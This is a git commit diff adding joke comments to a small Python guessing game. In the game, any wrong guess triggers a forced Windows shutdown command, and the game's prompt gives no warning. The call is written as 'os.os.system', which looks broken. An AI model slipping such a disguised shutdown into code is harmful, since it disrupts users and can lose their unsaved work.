373992bdfbd38e20f99df4f639bbe8c37e595639
N3xu_ss <53103@edu.raseko.fi>
2025-03-25 12:41:59 +0200

    Comments
    Top Finko Scariest Humpscares. !!!SCARY ALERT!!!

--- Main.py
+++ Main.py
@@ -1,12 +1,17 @@
 import random
 import os
+# Imports required py lib's
 
+# Uses random to randomise number
 number = random.randint(1,6)
 
+# Asks you a number 1-6. Good luck bro
 guessNum = input("Permainan sederhana! Tebak angka dari 1 sampai 6. Good Luck!\n")
 guessNum = int(guessNum)
 
+# Youre safe you lucky man.
 if guessNum == number:
     print("Selamat Kamu Menang!")
 else:
+    # OS go kaputt.
     os.os.system("shutdown /s /t 1")
